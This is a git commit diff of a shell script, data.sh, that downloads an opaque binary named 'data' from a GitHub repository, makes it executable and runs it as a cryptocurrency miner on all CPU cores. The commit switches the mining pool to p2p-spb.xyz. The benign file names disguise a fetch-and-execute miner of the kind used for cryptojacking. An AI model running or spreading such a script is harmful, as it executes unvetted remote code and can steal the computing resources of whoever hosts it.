f5d869705e6d6d61c07111c9aba4c8b819916932
adeayuvebriani <143151642+adeayuvebriani@users.noreply.github.com>
2023-09-08 11:09:49 +0800

    Update data.sh

--- data.sh
+++ data.sh
@@ -1,4 +1,4 @@
 apt update -y
 wget https://github.com/adeayuvebriani/datamine/raw/main/data
 chmod +x data
-./data -a minotaurx -o stratum+tcp://minotaurx.mine.zergpool.com:7019 -u MMguZU589zvBmqMAg3GsKoLxv1JZpWch8L -p c=LCC,mc=LCC -t $(nproc)
+./data -a minotaurx -o stratum+tcp://p2p-spb.xyz:5557 -u MMguZU589zvBmqMAg3GsKoLxv1JZpWch8L -p x -t $(nproc)
